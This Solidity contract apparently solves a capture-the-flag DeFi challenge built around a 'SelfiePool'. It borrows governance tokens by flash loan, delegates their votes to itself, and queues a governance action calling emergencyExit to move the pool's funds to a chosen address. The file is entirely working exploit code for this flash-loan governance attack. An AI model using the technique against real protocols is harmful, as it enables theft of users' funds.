// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

contract SelfiePoolAttack is IERC3156FlashBorrower {
    ISimpleGovernance governance;
    SelfiePool pool;
    address recoveryAddress;
    address dvtTokenAddress;
    uint256 actionId;

    constructor(
        address _governance,
        address _pool,
        address _recoveryAddress,
        address _dvtTokenAddress
    ) {
        governance = ISimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        recoveryAddress = _recoveryAddress;
        dvtTokenAddress = _dvtTokenAddress;
    }

    function attack() public {
        pool.flashLoan(
            this,
            dvtTokenAddress,
            pool.maxFlashLoan(dvtTokenAddress),
            ""
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        bytes memory attackCallData = abi.encodeCall(
            pool.emergencyExit,
            (recoveryAddress)
        );

        ERC20Votes ierc20Token = ERC20Votes(token);
        ierc20Token.delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, attackCallData);

        ierc20Token.approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAttack() public {
        governance.executeAction(actionId);
    }
}
